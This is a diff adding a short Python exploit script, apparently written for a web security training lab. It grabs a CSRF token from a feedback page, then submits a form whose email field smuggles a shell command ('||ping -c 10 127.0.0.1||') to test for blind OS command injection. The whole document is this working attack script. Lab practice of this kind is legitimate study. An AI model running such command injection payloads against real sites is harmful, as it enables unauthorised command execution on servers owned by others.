@@ -1,0 +1,37 @@
+import requests
+import re
+
+session = requests.session()
+base_url = input("Enter the lab base Url: ").strip().rstrip("/")
+target_url = (f"{base_url}/feedback/submit")
+feedback_url = (f"{base_url}/feedback")
+initial_page = session.get(feedback_url)
+
+csrf_match = re.search(r'name="csrf" value="([^"]+)"', initial_page.text)
+
+if csrf_match:
+    csrf_token = csrf_match.group(1)
+    print(f" ==> Found CSRF Token: {csrf_token}")
+else:
+    print(" ==> Error: Could not find CSRF token on the page.")
+    exit()
+
+payload = {
+    'csrf': csrf_token,
+    'name': "xyzxyz",
+    'email': "takethis@123||ping -c 10 127.0.0.1||",
+    'subject': "subject_0001",
+    'message': "VulnerabilityHeremeowmeow"
+}
+
+try:
+    response = session.post(target_url, data=payload, timeout=20)
+except requests.RequestException as e:
+    print(f"[*] Error Occured: {e} ")
+    exit(1)
+
+if response.status_code == 200:
+    print("[*] Payload executed successfully....")
+    print(f"Output: \n{response.text.strip()}")
+else:
+    print(f"Exploit failed: status {response.status_code}")
